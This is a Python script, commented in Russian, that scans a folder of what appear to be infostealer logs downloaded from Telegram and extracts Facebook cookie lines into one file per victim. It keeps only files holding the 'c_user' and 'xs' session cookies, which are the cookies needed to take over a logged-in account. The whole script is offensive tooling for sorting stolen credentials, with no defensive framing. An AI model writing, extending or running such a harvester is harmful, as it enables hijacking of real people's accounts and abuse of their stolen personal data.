import os
import glob
import shutil

SOURCE_DIRECTORY = r'C:\Users\closirr\Downloads\Telegram Desktop\Logs_21 December'
TARGET_DIRECTORY = r'.\facebook_cookies'

def main():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)

    count_processed = 0
    count_extracted = 0

    print(f"Сканирование {SOURCE_DIRECTORY}...")
    
    # Рекурсивный поиск .txt файлов в папках Cookies или Browser
    for root, dirs, files in os.walk(SOURCE_DIRECTORY):
        for filename in files:
            # Ищем .txt файлы в папках Cookies или Browser, или файлы с "Cookies" в названии
            is_in_cookies_folder = "Cookies" in root or "Browser" in root
            is_cookies_file = "Cookies" in filename or "cookies" in filename.lower()
            if filename.endswith(".txt") and (is_in_cookies_folder or is_cookies_file):
                filepath = os.path.join(root, filename)
                
                # Определяем уникальное имя файла
                path_parts = os.path.normpath(filepath).split(os.sep)
                
                log_id = "unknown"
                for part in reversed(path_parts[:-1]):
                    # Ищем папку с ID в формате XX[...][...] (например AE[ABC123][2025-12-21T...])
                    if "[" in part and "]" in part and len(part) > 5:
                        log_id = part
                        break
                
                if log_id == "unknown":
                    try:
                        if path_parts[-2].lower() == 'cookies':
                            log_id = path_parts[-3]
                        else:
                            log_id = path_parts[-2]
                    except:
                        log_id = "unknown"

                safe_log_id = "".join(x for x in log_id if x.isalnum() or x in "[]_-")
                safe_filename = "".join(x for x in filename if x.isalnum() or x in "._-").replace(".txt", "")
                
                # Выходной файл .txt
                output_filename = f"extracted_{safe_log_id}_{safe_filename}.txt"
                output_path = os.path.join(TARGET_DIRECTORY, output_filename)
                
                extracted_lines = []
                header_line = ""
                
                try:
                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                        
                        # Сохраняем заголовок если есть
                        if lines and (lines[0].startswith("# Netscape") or lines[0].startswith("# HTTP")):
                            header_line = lines[0]
                            
                        for line in lines:
                            # Пропускаем заголовок (добавим его отдельно)
                            if line.startswith("# Netscape") or line.startswith("# HTTP"):
                                continue
                                
                            # Фильтруем по facebook.com и связанным доменам
                            if "facebook.com" in line or "fb.com" in line or "fbcdn.net" in line:
                                extracted_lines.append(line)
                                
                except Exception as e:
                    print(f"Ошибка чтения {filepath}: {e}")
                    continue

                if extracted_lines:
                    # ВАЛИДАЦИЯ
                    # Ключевая проверка: ДОЛЖЕН содержать 'c_user' для Facebook
                    # c_user - это ID пользователя Facebook, обязательный для авторизации
                    
                    content_str = "".join(extracted_lines)
                    is_valid = False
                    
                    # Проверяем наличие ключевых куки Facebook
                    # c_user - ID пользователя (обязательно)
                    # xs - сессионный токен (обязательно)
                    has_c_user = "c_user" in content_str
                    has_xs = "xs" in content_str
                    
                    if has_c_user and has_xs:
                        is_valid = True
                    
                    if not is_valid:
                        missing = []
                        if not has_c_user:
                            missing.append("c_user")
                        if not has_xs:
                            missing.append("xs")
                        print(f"Пропуск {filename}: Отсутствуют куки: {', '.join(missing)} (Строк: {len(extracted_lines)})")
                        continue

                    print(f"Найдено {len(extracted_lines)} Facebook куки в {log_id}/{filename} (Валидно)")
                    try:
                        with open(output_path, 'w', encoding='utf-8') as f:
                            if header_line:
                                f.write(header_line)
                            
                            for line in extracted_lines:
                                f.write(line)
                                
                        count_extracted += 1
                    except Exception as e:
                        print(f"Ошибка записи в {output_path}: {e}")
                
                count_processed += 1

    print(f"Готово. Просканировано {count_processed} файлов. Извлечено {count_extracted} файлов куки в {TARGET_DIRECTORY}.")

if __name__ == '__main__':
    main()
